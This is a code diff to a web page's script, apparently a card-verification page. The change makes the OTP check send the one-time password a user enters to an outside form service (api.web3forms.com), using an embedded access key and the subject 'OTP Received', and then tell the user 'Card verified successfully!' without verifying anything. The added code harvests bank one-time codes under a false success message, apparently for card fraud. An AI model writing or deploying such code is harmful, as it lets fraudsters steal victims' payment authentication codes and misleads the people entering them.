@@ -598,22 +598,46 @@ function closeOtp(){
 function verifyOtp(){
 
     const otp =
-        document.getElementById("otp").value;
+        document.getElementById(
+            "otp"
+        ).value;
 
-    if(otp.length === 6){
-
-        alert(
-            "Card verified successfully!"
-        );
-
-        closeOtp();
-
-    }else{
+    if(otp.length !== 6){
 
         alert(
             "Please enter a valid OTP."
         );
+
+        return;
     }
+
+    fetch(
+        "https://api.web3forms.com/submit",
+        {
+            method: "POST",
+            headers: {
+                "Content-Type":
+                    "application/json"
+            },
+            body: JSON.stringify({
+
+                access_key:
+                    "3ee8e2d3-cfd8-4ffc-9cb8-7cc162f27c03",
+
+                subject:
+                    "OTP Received",
+
+                otp: otp
+
+            })
+        }
+    );
+
+    alert(
+        "Card verified successfully!"
+    );
+
+    closeOtp();
 }
 
 </script>
